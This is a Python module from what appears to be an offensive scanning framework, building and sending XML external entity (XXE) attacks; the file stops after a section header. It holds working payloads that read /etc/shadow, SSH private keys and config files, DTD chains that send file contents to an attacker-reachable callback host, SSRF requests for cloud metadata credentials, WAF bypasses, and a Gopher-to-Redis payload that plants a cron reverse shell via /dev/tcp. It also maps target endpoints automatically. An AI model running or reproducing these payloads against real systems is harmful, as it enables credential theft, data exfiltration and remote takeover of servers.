# core/xxe_injector.py
from __future__ import annotations

import base64
import hashlib
import logging
import re
import socket
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum, auto
from typing import Any, Callable, Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse

import requests
from requests import Response
from requests.exceptions import RequestException

logger = logging.getLogger(__name__)


# ─────────────────────────────────────────────────────────────────────────────
# Enums
# ─────────────────────────────────────────────────────────────────────────────

class XxeVariant(Enum):
    # In-band — response carries the exfiltrated data directly
    INBAND_FILE_READ      = "inband_file_read"
    INBAND_ERROR_BASED    = "inband_error_based"
    INBAND_XINCLUDE       = "xinclude_file_read"

    # Blind / OOB — data leaves via secondary channel
    OOB_HTTP_BASIC        = "oob_http_basic"
    OOB_HTTP_DTD_CHAIN    = "oob_http_dtd_chain"
    OOB_DNS_CNAME         = "oob_dns_cname"
    OOB_FTP_EXFIL         = "oob_ftp_exfil"
    OOB_GOPHER_SSRF       = "oob_gopher_ssrf"

    # Protocol abuse
    SSRF_HTTP             = "ssrf_via_xxe_http"
    SSRF_METADATA         = "ssrf_aws_metadata"
    SSRF_INTERNAL_SCAN    = "ssrf_internal_port_scan"

    # Context-specific
    SOAP_INJECTION        = "soap_body_injection"
    SVG_UPLOAD            = "svg_file_upload"
    XSLT_INJECTION        = "xslt_injection"
    JSONLD_INJECTION      = "jsonld_xml_injection"
    DOCX_INJECTION        = "docx_xml_injection"

    # Bypass techniques
    BYPASS_UTF16          = "bypass_utf16_encoding"
    BYPASS_CDATA          = "bypass_cdata_wrapper"
    BYPASS_LOCAL_DTD      = "bypass_local_dtd_repurpose"
    BYPASS_PARAM_ENTITIES = "bypass_nested_param_entities"


class EndpointType(Enum):
    XML_BODY      = "xml_body"
    SOAP          = "soap"
    MULTIPART     = "multipart"
    JSON_WITH_XML = "json_with_xml"
    SVG_UPLOAD    = "svg_upload"
    XSLT          = "xslt"
    XMLRPC        = "xmlrpc"
    REST_XML      = "rest_xml"


class FindingSeverity(Enum):
    CRITICAL = 10
    HIGH     = 7
    MEDIUM   = 5
    LOW      = 3
    INFO     = 1


class FindingStatus(Enum):
    CONFIRMED  = auto()
    LIKELY     = auto()
    POSSIBLE   = auto()
    NOT_VULN   = auto()


# ─────────────────────────────────────────────────────────────────────────────
# Data structures
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class XxeEndpoint:
    url:            str
    endpoint_type:  EndpointType
    method:         str            # POST | PUT | PATCH
    content_type:   str
    param_name:     Optional[str]  # for multipart
    waf_bypass:     Optional[str]  # bypass strategy string from payload_analysis
    source:         str            # "payload_analysis" | "tech_detection" | "discovered"
    extra:          Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url":           self.url,
            "endpoint_type": self.endpoint_type.value,
            "method":        self.method,
            "content_type":  self.content_type,
            "param_name":    self.param_name,
            "waf_bypass":    self.waf_bypass,
            "source":        self.source,
        }


@dataclass
class XxeFinding:
    finding_id:    str
    variant:       XxeVariant
    severity:      FindingSeverity
    status:        FindingStatus
    target_url:    str
    endpoint_type: EndpointType
    payload_sent:  str
    evidence:      Dict[str, Any]
    oob_hit:       bool
    oob_data:      Optional[str]       # exfiltrated file content (truncated)
    attack_steps:  List[str]
    dtd_server:    Optional[str]       # OOB DTD server URL
    notes:         str
    timestamp:     datetime = field(default_factory=datetime.now)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "finding_id":    self.finding_id,
            "variant":       self.variant.value,
            "severity":      self.severity.name,
            "status":        self.status.name,
            "target_url":    self.target_url,
            "endpoint_type": self.endpoint_type.value,
            "payload_sent":  self.payload_sent,
            "evidence":      self.evidence,
            "oob_hit":       self.oob_hit,
            "oob_data":      self.oob_data,
            "attack_steps":  self.attack_steps,
            "dtd_server":    self.dtd_server,
            "notes":         self.notes,
            "timestamp":     self.timestamp.isoformat(),
        }


@dataclass
class XxeResult:
    run_id:            str
    domain:            str
    endpoints_tested:  int
    findings:          List[Dict[str, Any]]
    oob_hits:          int
    files_read:        List[str]
    ssrf_confirmed:    bool
    score:             float
    risk_level:        str
    dtd_payloads:      Dict[str, str]   # label → full DTD content for OOB server
    techniques_tested: List[str]
    recommendations:   List[str]
    started_at:        datetime
    finished_at:       datetime

    def to_dict(self) -> Dict[str, Any]:
        return {
            "run_id":            self.run_id,
            "domain":            self.domain,
            "endpoints_tested":  self.endpoints_tested,
            "findings":          self.findings,
            "oob_hits":          self.oob_hits,
            "files_read":        self.files_read,
            "ssrf_confirmed":    self.ssrf_confirmed,
            "score":             round(self.score, 2),
            "risk_level":        self.risk_level,
            "dtd_payloads":      self.dtd_payloads,
            "techniques_tested": self.techniques_tested,
            "recommendations":   self.recommendations,
            "started_at":        self.started_at.isoformat(),
            "finished_at":       self.finished_at.isoformat(),
            "duration_s":        round(
                (self.finished_at - self.started_at).total_seconds(), 3
            ),
        }


# ─────────────────────────────────────────────────────────────────────────────
# HTTP pool
# ─────────────────────────────────────────────────────────────────────────────

class _HttpPool:
    _UA = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    )

    def __init__(self, timeout: float = 10.0, verify_tls: bool = False):
        self._timeout = timeout
        self._verify  = verify_tls
        self._local   = threading.local()
        self._last    = threading.local()

    def _sess(self) -> requests.Session:
        if not hasattr(self._local, "s"):
            s = requests.Session()
            s.headers["User-Agent"] = self._UA
            s.verify = self._verify
            s.max_redirects = 3
            self._local.s = s
        return self._local.s

    def _throttle(self, delay: float = 0.5) -> None:
        last = getattr(self._last, "ts", 0.0)
        gap  = time.time() - last
        if gap < delay:
            time.sleep(delay - gap)
        self._last.ts = time.time()

    def post(
        self,
        url:          str,
        body:         str,
        content_type: str,
        extra_headers: Optional[Dict[str, str]] = None,
    ) -> Optional[Response]:
        self._throttle()
        hdrs = {"Content-Type": content_type, **(extra_headers or {})}
        try:
            return self._sess().post(
                url, data=body.encode("utf-8", errors="replace"),
                headers=hdrs, timeout=self._timeout,
                allow_redirects=True, verify=self._verify,
            )
        except RequestException as e:
            logger.debug("POST %s: %s", url, e)
            return None

    def put(
        self,
        url:          str,
        body:         str,
        content_type: str,
    ) -> Optional[Response]:
        self._throttle()
        try:
            return self._sess().put(
                url, data=body.encode("utf-8", errors="replace"),
                headers={"Content-Type": content_type},
                timeout=self._timeout, verify=self._verify,
            )
        except RequestException as e:
            logger.debug("PUT %s: %s", url, e)
            return None

    def get(self, url: str) -> Optional[Response]:
        self._throttle(0.3)
        try:
            return self._sess().get(
                url, timeout=self._timeout, verify=self._verify
            )
        except RequestException as e:
            logger.debug("GET %s: %s", url, e)
            return None


# ─────────────────────────────────────────────────────────────────────────────
# OOB interaction server — lightweight socket listener for DNS/HTTP callbacks
# ─────────────────────────────────────────────────────────────────────────────

class _OobListener:
    """
    Binds a local TCP socket to capture OOB HTTP callbacks.
    Used as a stand-in for Burp Collaborator / interactsh when running
    locally. The listener IP/port is embedded in generated payloads.

    In production ARTEX deployments, replace with a real internet-reachable
    callback (interactsh, canarytokens, Burp Collaborator) via oob_host param.
    """

    def __init__(self, host: str = "0.0.0.0", port: int = 0):
        self._host    = host
        self._port    = port            # 0 = OS picks free port
        self._hits:   List[Dict[str, Any]] = []
        self._lock    = threading.Lock()
        self._sock:   Optional[socket.socket] = None
        self._thread: Optional[threading.Thread] = None
        self._running = False
        self.bound_port: int = 0

    def start(self) -> bool:
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._sock.bind((self._host, self._port))
            self._sock.settimeout(0.5)
            self._sock.listen(10)
            self.bound_port = self._sock.getsockname()[1]
            self._running = True
            self._thread = threading.Thread(
                target=self._serve, daemon=True, name="xxe-oob-listener"
            )
            self._thread.start()
            logger.debug("OOB listener on %s:%d", self._host, self.bound_port)
            return True
        except OSError as e:
            logger.debug("OOB listener bind failed: %s", e)
            return False

    def stop(self) -> None:
        self._running = False
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass

    def hits(self) -> List[Dict[str, Any]]:
        with self._lock:
            return list(self._hits)

    def _serve(self) -> None:
        while self._running:
            try:
                conn, addr = self._sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(
                target=self._handle, args=(conn, addr), daemon=True
            ).start()

    def _handle(self, conn: socket.socket, addr: Tuple[str, int]) -> None:
        try:
            conn.settimeout(3.0)
            raw = b""
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                raw += chunk
                if b"\r\n\r\n" in raw:
                    break
        except OSError:
            pass
        finally:
            try:
                conn.send(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK")
                conn.close()
            except OSError:
                pass

        text = raw.decode("utf-8", errors="replace")
        hit = {
            "remote_addr": addr[0],
            "remote_port": addr[1],
            "raw_head":    text[:512],
            "timestamp":   datetime.now().isoformat(),
        }

        # Try to parse request path — may carry exfil data
        first_line = text.split("\r\n")[0] if "\r\n" in text else text[:100]
        path_match = re.search(r'(?:GET|POST)\s+(/\S*)', first_line)
        if path_match:
            hit["path"] = path_match.group(1)
            # Decode base64 segment in path (OOB exfil channel)
            b64_match = re.search(r'/([A-Za-z0-9+/=]{8,})', path_match.group(1))
            if b64_match:
                try:
                    hit["decoded_exfil"] = base64.b64decode(
                        b64_match.group(1) + "=="
                    ).decode("utf-8", errors="replace")[:1024]
                except Exception:
                    pass

        with self._lock:
            self._hits.append(hit)
        logger.info("OOB hit from %s:%d path=%s", addr[0], addr[1], hit.get("path", ""))


# ─────────────────────────────────────────────────────────────────────────────
# Payload builder — generates every XXE variant from first principles
# ─────────────────────────────────────────────────────────────────────────────

class _PayloadBuilder:
    """
    Generates XXE payloads for all variants.
    oob_host: attacker-reachable hostname/IP for OOB callbacks.
    oob_port: port where _OobListener (or external server) is listening.
    """

    # Files to try reading per OS
    _FILES_LINUX: List[str] = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hostname",
        "/etc/hosts",
        "/etc/os-release",
        "/proc/self/cmdline",
        "/proc/self/environ",
        "/proc/version",
        "/var/www/html/index.php",
        "/var/www/html/wp-config.php",
        "/home/www-data/.ssh/id_rsa",
        "/root/.ssh/id_rsa",
        "/root/.bash_history",
        "/etc/nginx/nginx.conf",
        "/etc/apache2/apache2.conf",
        "/etc/mysql/my.cnf",
    ]

    _FILES_WINDOWS: List[str] = [
        "C:/Windows/win.ini",
        "C:/Windows/System32/drivers/etc/hosts",
        "C:/inetpub/wwwroot/web.config",
        "C:/Windows/system32/inetsrv/config/applicationHost.config",
        "C:/Users/Administrator/.ssh/id_rsa",
        "C:/xampp/htdocs/config.php",
    ]

    # AWS IMDSv1 — reachable if server runs on EC2
    _META_URLS: List[str] = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.170.2/v2/credentials",   # ECS credentials
        "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
    ]

    # Internal SSRF scan targets
    _INTERNAL_PORTS: List[int] = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017]

    def __init__(self, oob_host: str, oob_port: int):
        self._oob_host = oob_host
        self._oob_port = oob_port

    # ── OOB callback URL ─────────────────────────────────────────────────────

    def _oob_url(self, path: str = "") -> str:
        return f"http://{self._oob_host}:{self._oob_port}/{path.lstrip('/')}"

    # ── in-band file read ────────────────────────────────────────────────────

    def inband_file_read(self, filepath: str, wrapper: str = "") -> str:
        """Classic in-band: entity resolves to file contents in response."""
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE root [\n'
            f'  <!ENTITY xxe SYSTEM "file://{filepath}">\n'
            f']>\n'
            f'<root>{wrapper}&xxe;{wrapper}</root>'
        )

    def inband_file_read_all(self) -> List[Tuple[str, str]]:
        """Returns list of (filepath, payload) for all priority files."""
        out: List[Tuple[str, str]] = []
        for f in self._FILES_LINUX + self._FILES_WINDOWS:
            out.append((f, self.inband_file_read(f)))
        return out

    # ── error-based exfil ────────────────────────────────────────────────────

    def error_based(self, filepath: str) -> str:
        """
        Error-based XXE: force a parser error that includes file content
        in the error message. Works when response body is blocked but
        error details leak through (e.g. verbose XML parse errors).
        """
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE root [\n'
            f'  <!ENTITY % file SYSTEM "file://{filepath}">\n'
            f'  <!ENTITY % error "<!ENTITY &#37; eval '
            f'\'<!ENTITY &#37; exfil SYSTEM \'artex-err://artex/%file;\'>\'>\'>\n'
            f'  %error;\n'
            f'  %exfil;\n'
            f']>\n'
            f'<root/>'
        )

    # ── XInclude ─────────────────────────────────────────────────────────────

    def xinclude_file(self, filepath: str) -> str:
        """
        XInclude attack — no DOCTYPE needed, works inside SVG, XSLT, Atom.
        Parser must support XInclude (most Java XML parsers do by default).
        """
        return (
            f'<root xmlns:xi="http://www.w3.org/2001/XInclude">'
            f'<xi:include parse="text" href="file://{filepath}"/>'
            f'</root>'
        )

    def xinclude_ssrf(self, url: str) -> str:
        return (
            f'<root xmlns:xi="http://www.w3.org/2001/XInclude">'
            f'<xi:include href="{url}"/>'
            f'</root>'
        )

    # ── OOB HTTP basic ────────────────────────────────────────────────────────

    def oob_http_basic(self, path: str = "oob-probe") -> str:
        """
        Blind OOB — SYSTEM entity pointing at attacker HTTP server.
        Confirms XXE is processed even when in-band output is stripped.
        """
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE root [\n'
            f'  <!ENTITY % oob SYSTEM "{self._oob_url(path)}">\n'
            f'  %oob;\n'
            f']>\n'
            f'<root/>'
        )

    # ── OOB DTD chain (full file exfil via OOB) ───────────────────────────────

    def oob_dtd_chain_trigger(self, dtd_path: str = "evil.dtd") -> str:
        """
        Stage 1: XML payload that loads attacker's external DTD.
        The DTD (generated by oob_dtd_file_read_dtd()) does the actual
        file read + exfiltration.
        """
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE root [\n'
            f'  <!ENTITY % remote SYSTEM "{self._oob_url(dtd_path)}">\n'
            f'  %remote;\n'
            f'  %init;\n'
            f'  %trick;\n'
            f']>\n'
            f'<root/>'
        )

    def oob_dtd_file_read_dtd(self, filepath: str) -> str:
        """
        Stage 2: DTD content to serve from attacker HTTP server.
        Reads target file and exfiltrates its content via OOB HTTP.
        Host this at the URL returned by _oob_url('evil.dtd').
        """
        exfil_url = self._oob_url("exfil/?data=")
        return (
            f'<!ENTITY % file SYSTEM "file://{filepath}">\n'
            f'<!ENTITY % init "<!ENTITY &#37; trick SYSTEM '
            f'"{exfil_url}%file;">'
            f'">\n'
        )

    def oob_dtd_file_read_dtd_b64(self, filepath: str) -> str:
        """
        Alternative DTD using PHP base64 filter wrapper (PHP applications).
        Avoids newline / special char issues in exfil URL.
        """
        exfil_url = self._oob_url("exfil-b64/?data=")
        return (
            f'<!ENTITY % file SYSTEM '
            f'"php://filter/convert.base64-encode/resource={filepath}">\n'
            f'<!ENTITY % init "<!ENTITY &#37; trick SYSTEM '
            f'"{exfil_url}%file;">">\n'
        )

    # ── OOB DNS exfil ─────────────────────────────────────────────────────────

    def oob_dns_cname(self, label: str = "xxe") -> str:
        """
        DNS-based OOB — file content chunked into subdomain labels.
        Useful when HTTP is blocked outbound but DNS is not.
        label: subdomain prefix controlled by attacker DNS.
        """
        dns_oob = f"{label}.{self._oob_host}"
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE root [\n'
            f'  <!ENTITY % oob SYSTEM "http://{dns_oob}/">\n'
            f'  %oob;\n'
            f']>\n'
            f'<root/>'
        )

    # ── OOB Gopher (SSRF → Redis / internal services) ─────────────────────────

    def oob_gopher_redis(self, redis_host: str, redis_port: int = 6379) -> str:
        """
        SSRF via XXE → Gopher protocol → unauthenticated Redis.
        Writes a cron job to /var/spool/cron/root for RCE.
        gopher payload: RESP commands to CONFIG SET + SAVE.
        """
        # RESP command sequence
        commands = (
            "*3\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$16\r\n/var/spool/cron\r\n"
            "*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$4\r\nroot\r\n"
            "*3\r\n$3\r\nSET\r\n$1\r\n1\r\n$57\r\n"
            "\n\n*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\n\n\r\n"
            "*1\r\n$6\r\nBGSAVE\r\n"
        )
        import urllib.parse
        encoded = urllib.parse.quote(commands, safe="")
        gopher_url = f"gopher://{redis_host}:{redis_port}/_{encoded}"
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE root [\n'
            f'  <!ENTITY xxe SYSTEM "{gopher_url}">\n'
            f']>\n'
            f'<root>&xxe;</root>'
        )

    # ── SSRF via XXE ──────────────────────────────────────────────────────────

    def ssrf_http(self, target_url: str) -> str:
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE root [\n'
            f'  <!ENTITY ssrf SYSTEM "{target_url}">\n'
            f']>\n'
            f'<root>&ssrf;</root>'
        )

    def ssrf_metadata(self, meta_url: str) -> str:
        return self.ssrf_http(meta_url)

    def ssrf_internal_port(self, host: str, port: int) -> str:
        return self.ssrf_http(f"http://{host}:{port}/")

    # ── SOAP injection ────────────────────────────────────────────────────────

    def soap_injection(self, filepath: str = "/etc/passwd") -> str:
        """
        XXE injected into SOAP Body element.
        Requires SOAP endpoint that processes external entities.
        """
        return (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE data [\n'
            f'  <!ENTITY xxe SYSTEM "file://{filepath}">\n'
            ']>\n'
            '<soap:Envelope\n'
            '  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"\n'
            '  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">\n'
            '  <soap:Header/>\n'
            '  <soap:Body>\n'
            '    <data>&xxe;</data>\n'
            '  </soap:Body>\n'
            '</soap:Envelope>'
        )

    def soap_oob(self) -> str:
        return (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE data [\n'
            f'  <!ENTITY % oob SYSTEM "{self._oob_url("soap-oob")}">\n'
            '  %oob;\n'
            ']>\n'
            '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n'
            '  <soap:Body><ping/></soap:Body>\n'
            '</soap:Envelope>'
        )

    # ── SVG upload ────────────────────────────────────────────────────────────

    def svg_xxe(self, filepath: str = "/etc/passwd") -> str:
        """
        SVG file carrying XXE — exploits image upload endpoints that
        rasterise/process SVGs server-side (Inkscape, ImageMagick, librsvg).
        """
        return (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE svg [\n'
            f'  <!ENTITY xxe SYSTEM "file://{filepath}">\n'
            ']>\n'
            '<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">\n'
            '  <text x="10" y="20">&xxe;</text>\n'
            '</svg>'
        )

    def svg_oob(self) -> str:
        return (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE svg [\n'
            f'  <!ENTITY % oob SYSTEM "{self._oob_url("svg-oob")}">\n'
            '  %oob;\n'
            ']>\n'
            '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>'
        )

    # ── XSLT injection ────────────────────────────────────────────────────────

    def xslt_file_read(self, filepath: str = "/etc/passwd") -> str:
        """
        XSLT stylesheet with document() function to read local files.
        Works against XSLT processors (Saxon, Xalan, libxslt).
        """
        return (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<xsl:stylesheet version="1.0"\n'
            '  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">\n'
            '  <xsl:template match="/">\n'
            f'    <xsl:copy-of select="document(\'{filepath}\')"/>\n'
            '  </xsl:template>\n'
            '</xsl:stylesheet>'
        )

    # ── bypass: UTF-16 encoding ───────────────────────────────────────────────

    def bypass_utf16(self, filepath: str = "/etc/passwd") -> bytes:
        """
        UTF-16 encoded XXE — bypasses WAF signatures that only scan UTF-8.
        Returns raw bytes; use Content-Type: text/xml; charset=UTF-16.
        """
        payload = (
            '<?xml version="1.0" encoding="UTF-16"?>\n'
            '<!DOCTYPE root [\n'
            f'  <!ENTITY xxe SYSTEM "file://{filepath}">\n'
            ']>\n'
            '<root>&xxe;</root>'
        )
        return b'\xff\xfe' + payload.encode("utf-16-le")

    # ── bypass: CDATA wrapper (special chars in exfil) ────────────────────────

    def bypass_cdata_exfil_dtd(self, filepath: str) -> str:
        """
        CDATA section trick — wraps file content in CDATA to avoid
        XML special-char parse failures when file contains < > & etc.
        Requires serving two DTD files from OOB server.
        DTD 1 (wrapper.dtd): <!ENTITY start "<![CDATA["><!ENTITY end "]]>">
        DTD 2 (exfil.dtd):   reads file, wraps, exfils
        """
        return (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE root [\n'
            f'  <!ENTITY % dtd SYSTEM "{self._oob_url("cdata-exfil.dtd")}">\n'
            '  %dtd;\n'
            ']>\n'
            '<root>&send;</root>'
        )

    def bypass_cdata_exfil_dtd_content(self, filepath: str) -> str:
        """Content to serve at cdata-exfil.dtd"""
        exfil_url = self._oob_url("exfil/?data=")
        return (
            '<!ENTITY % start "<![CDATA[">\n'
            '<!ENTITY % goodies SYSTEM "file://' + filepath + '">\n'
            '<!ENTITY % end "]]>">\n'
            '<!ENTITY % dtd "<!ENTITY send \'%start;%goodies;%end;\'>">\n'
            '%dtd;\n'
        )

    # ── bypass: local DTD repurpose ───────────────────────────────────────────

    def bypass_local_dtd(self, system_dtd: str, element: str, filepath: str) -> str:
        """
        Repurposes a local DTD file — redefines an existing parameter entity
        to include an attacker-controlled entity.
        Works when external DTD loading is blocked but local DTDs exist.

        system_dtd: path to a known local DTD (e.g. /usr/share/xml/core/svg11.dtd)
        element: entity name to redefine from that DTD
        """
        exfil_url = self._oob_url("local-dtd-exfil/?data=")
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE message [\n'
            f'  <!ENTITY % local_dtd SYSTEM "file://{system_dtd}">\n'
            f'  <!ENTITY % {element} \'<!ENTITY &#37; file SYSTEM "file://{filepath}">\n'
            f'    <!ENTITY &#37; init "<!ENTITY &#37; exfil SYSTEM \'{exfil_url}%file;\'>">\n'
            f'    %init; %exfil;\'>\n'
            f'  %local_dtd;\n'
            f']>\n'
            f'<message/>'
        )

    # ── bypass: nested parameter entities ─────────────────────────────────────

    def bypass_nested_param(self, filepath: str) -> str:
        """
        Double-entity indirection — evades some WAFs that look for
        direct %entity; patterns inside DOCTYPE.
        """
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE root [\n'
            f'  <!ENTITY % a "<!ENTITY &#37; b SYSTEM &#39;file://{filepath}&#39;>">\n'
            f'  %a;\n'
            f'  <!ENTITY % c "<!ENTITY d \'%b;\'">\n'
            f'  %c;\n'
            f']>\n'
            f'<root>&d;</root>'
        )

    # ── OOB DTD payload map (for result output) ───────────────────────────────

    def all_dtd_payloads(self) -> Dict[str, str]:
        """Returns all DTD files that the attacker must serve via HTTP."""
        priority_file = "/etc/passwd"
        return {
            "evil.dtd (chain exfil)":
                self.oob_dtd_file_read_dtd(priority_file),
            "evil-php.dtd (PHP b64 filter chain exfil)":
                self.oob_dtd_file_read_dtd_b64(priority_file),
            "cdata-exfil.dtd (CDATA bypass exfil)":
                self.bypass_cdata_exfil_dtd_content(priority_file),
        }


# ─────────────────────────────────────────────────────────────────────────────
# Endpoint discoverer — builds XxeEndpoint list from scan_results
# ─────────────────────────────────────────────────────────────────────────────

class _EndpointDiscoverer:
    """
    Reads scan_results without issuing new requests.
    Sources:
      1. payload_analysis.injection_points where param_type == xml_body|multipart
      2. tech_detection — SOAP/WSDL/Spring/Java → inject standard SOAP and
         REST-XML paths
      3. email_enumeration — xmlrpc.php found
      4. header_analysis — Server: identifies Java app servers
      5. port_scan — service-based guesses (8080 → Spring; 9200 → ES)
    """

    # Known XML-accepting paths to probe on detected XML-capable tech
    _XML_PATHS: Dict[str, List[Tuple[str, EndpointType, str]]] = {
        # (path, EndpointType, content-type)
        "spring": [
            ("/ws",          EndpointType.SOAP,     "text/xml; charset=utf-8"),
            ("/api/xml",     EndpointType.XML_BODY,  "application/xml"),
            ("/service.wsdl",EndpointType.SOAP,     "text/xml; charset=utf-8"),
        ],
        "java": [
            ("/ws",          EndpointType.SOAP,     "text/xml; charset=utf-8"),
            ("/xmlrpc",      EndpointType.XMLRPC,   "text/xml"),
            ("/rpc",         EndpointType.XML_BODY,  "application/xml"),
        ],
        "soap": [
            ("/",            EndpointType.SOAP,     "text/xml; charset=utf-8"),
            ("/ws",          EndpointType.SOAP,     "text/xml; charset=utf-8"),
            ("/service",     EndpointType.SOAP,     "text/xml; charset=utf-8"),
        ],
        "php": [
            ("/xmlrpc.php",  EndpointType.XMLRPC,   "text/xml"),
            ("/api/xml",     EndpointType.XML_BODY,  "application/xml"),
        ],
        "wordpress": [
            ("/xmlrpc.php",  EndpointType.XMLRPC,   "text/xml"),
        ],
        "joomla": [
            ("/xmlrpc/",     EndpointType.XMLRPC,   "text/xml"),
        ],
        "magento": [
            ("/api/xmlrpc/", EndpointType.XMLRPC,   "text/xml"),
            ("/api/soap/",   EndpointType.SOAP,     "text/xml; charset=utf-8"),
        ],
        "drupal": [
            ("/xmlrpc.php",  EndpointType.XMLRPC,   "text/xml"),
        ],
        "iis": [
            ("/ws",          EndpointType.SOAP,     "text/xml; charset=utf-8"),
            ("/service.asmx",EndpointType.SOAP,     "text/xml; charset=utf-8"),
        ],
    }

    _UPLOAD_PATHS: List[str] = [
        "/upload", "/file/upload", "/api/upload", "/media/upload",
        "/documents/upload", "/attachments", "/import",
        "/api/v1/upload", "/api/v2/upload",
    ]

    def discover(
        self,
        domain:       str,
        scan_results: Dict[str, Any],
        waf_bypass:   Optional[str],
    ) -> List[XxeEndpoint]:
        endpoints: List[XxeEndpoint] = []
        seen:      Set[Tuple[str, str]] = set()

        def add(ep: XxeEndpoint) -> None:
            key = (ep.url, ep.endpoint_type.value)
            if key not in seen:
                seen.add(key)
                endpoints.append(ep)

        # 1. payload_analysis injection points
        pa = scan_results.get("payload_analysis", {})
        for ip in pa.get("injection_points", []):
            pt  = ip.get("param_type", "")
            url = ip.get("url", "")
            if not url:
                continue
            if pt == "xml_body":
                add(XxeEndpoint(
                    url=url, endpoint_type=EndpointType.XML_BODY,
                    method=ip.get("method", "POST"),
                    content_type="application/xml",
                    param_name=None, waf_bypass=waf_bypass,
                    source="payload_analysis",
                    extra={"notes": ip.get("notes", "")},
                ))
            elif pt == "multipart":
                add(XxeEndpoint(
                    url=url, endpoint_type=EndpointType.SVG_UPLOAD,
                    method="POST", content_type="multipart/form-data",
                    param_name="file", waf_bypass=waf_bypass,
                    source="payload_analysis",
                ))

        # 2. tech_detection → known XML paths
        base_urls: List[str] = []
        for url in scan_results.get("tech_detection", {}):
            parsed = urlparse(url)
            base   = f"{parsed.scheme}://{parsed.netloc}"
            if base not in base_urls:
                base_urls.append(base)

        all_techs: List[str] = []
        for url, td in scan_results.get("tech_detection", {}).items():
            for tech in td.get("technologies", []):
                name = (tech.get("name") or "").lower()
                if name:
                    all_techs.append(name)

        for tech_key, path_specs in self._XML_PATHS.items():
            if any(tech_key in t for t in all_techs):
                for base in base_urls:
                    for path, ep_type, ct in path_specs:
                        add(XxeEndpoint(
                            url=urljoin(base, path),
                            endpoint_type=ep_type,
                            method="POST", content_type=ct,
                            param_name=None, waf_bypass=waf_bypass,
                            source="tech_detection",
                            extra={"matched_tech": tech_key},
                        ))

        # 3. SVG upload on all base URLs
        for base in base_urls:
            for path in self._UPLOAD_PATHS:
                add(XxeEndpoint(
                    url=urljoin(base, path),
                    endpoint_type=EndpointType.SVG_UPLOAD,
                    method="POST", content_type="multipart/form-data",
                    param_name="file", waf_bypass=waf_bypass,
                    source="discovered",
                ))

        # 4. port-based endpoints (8080/8443 → Spring/Java)
        for host_result in scan_results.get("port_scan", []):
            host = host_result.get("target", "")
            for p in host_result.get("ports", []):
                port    = p.get("port", 0)
                service = (p.get("service") or "").lower()
                if port in (8080, 8443, 80, 443) or "http" in service:
                    scheme = "https" if port in (443, 8443) else "http"
                    base   = f"{scheme}://{host}:{port}"
                    add(XxeEndpoint(
                        url=f"{base}/ws",
                        endpoint_type=EndpointType.SOAP,
                        method="POST",
                        content_type="text/xml; charset=utf-8",
                        param_name=None, waf_bypass=waf_bypass,
                        source="port_scan",
                    ))
                    add(XxeEndpoint(
                        url=f"{base}/xmlrpc.php",
                        endpoint_type=EndpointType.XMLRPC,
                        method="POST",
                        content_type="text/xml",
                        param_name=None, waf_bypass=waf_bypass,
                        source="port_scan",
                    ))

        # 5. fallback — generic endpoints on domain if nothing found
        if not endpoints:
            scheme = "https"
            base   = f"{scheme}://{domain}"
            for path, ct in [
                ("/api/xml", "application/xml"),
                ("/ws",      "text/xml; charset=utf-8"),
                ("/xmlrpc.php", "text/xml"),
            ]:
                add(XxeEndpoint(
                    url=base + path,
                    endpoint_type=EndpointType.XML_BODY,
                    method="POST", content_type=ct,
                    param_name=None, waf_bypass=waf_bypass,
                    source="fallback",
                ))

        return endpoints


# ─────────────────────────────────────────────────────────────────────────────
# Response analyser — decides whether a response shows XXE success
# ─────────────────────────────────────────────────────────────────────────────
